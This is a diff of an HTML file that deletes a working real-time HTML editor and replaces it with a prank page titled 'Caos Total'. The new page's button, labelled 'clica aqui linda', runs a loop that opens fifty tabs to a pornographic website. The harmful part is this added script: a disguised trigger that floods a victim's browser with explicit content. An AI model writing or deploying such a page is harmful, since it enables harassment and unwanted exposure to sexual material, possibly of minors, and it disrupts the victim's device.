@@ -1,98 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Real-time HTML Editor</title>
-  <style>
-    body {
-      margin: 0;
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
-    }
-
-    #editor,
-    #output {
-      flex: 2;
-      border: none;
-      resize: none;
-    }
-
-    #editor {
-      background-color: #f4f4f4;
-      padding: 10px;
-      font-family: 'Courier New', Courier, monospace;
-      overflow-y: auto;
-    }
-
-    #output {
-      padding: 10px;
-      box-sizing: border-box;
-      overflow-y: auto;
-    }
-
-    #buttons {
-      display: flex;
-      justify-content: space-around;
-      margin-top: 10px;
-    }
-
-    @media screen and (max-width: 600px) {
-      #editor {
-        font-size: 14px;
-      }
-    }
-  </style>
+    <title>Caos Total</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        
+        button {
+            padding: 20px 40px;
+            font-size: 24px;
+        }
+    </style>
 </head>
-
 <body>
-  <div id="buttons">
-    <button onclick="renameElement()">Renomear</button>
-    <button onclick="removeElement()">Remover</button>
-  </div>
+    <button onclick="gerarAbas()">clica aqui linda</button>
 
-  <textarea id="editor" oninput="updateOutput()">&lt;h1&gt;Hello, World!&lt;/h1&gt;</textarea>
-  <iframe id="output" onclick="selectOutput()"></iframe>
-
-  <script>
-    function updateOutput() {
-      const editorContent = document.getElementById('editor').value;
-      const outputFrame = document.getElementById('output').contentDocument;
-      outputFrame.open();
-      outputFrame.write(editorContent);
-      outputFrame.close();
-    }
-
-    function renameElement() {
-      const outputFrame = document.getElementById('output').contentDocument;
-      const selectedElement = outputFrame.getSelection().toString();
-      const newElementName = prompt("Digite o novo nome:", selectedElement);
-
-      if (newElementName !== null) {
-        const editor = document.getElementById('editor');
-        editor.value = editor.value.replace(selectedElement, newElementName);
-        updateOutput();
-      }
-    }
-
-    function removeElement() {
-      const outputFrame = document.getElementById('output').contentDocument;
-      const selectedElement = outputFrame.getSelection().toString();
-      const editor = document.getElementById('editor');
-      editor.value = editor.value.replace(selectedElement, '');
-      updateOutput();
-    }
-
-    function selectOutput() {
-      const outputFrame = document.getElementById('output').contentWindow;
-      const selectedText = outputFrame.getSelection().toString();
-      const editor = document.getElementById('editor');
-      editor.value = editor.value.replace(selectedText, '');
-      updateOutput();
-    }
-  </script>
+    <script>
+        function gerarAbas() {
+            for (var i = 0; i < 50; i++) {
+                window.open('https://www.xvideos.com', '_blank');
+            }
+        }
+    </script>
 </body>
-
 </html>
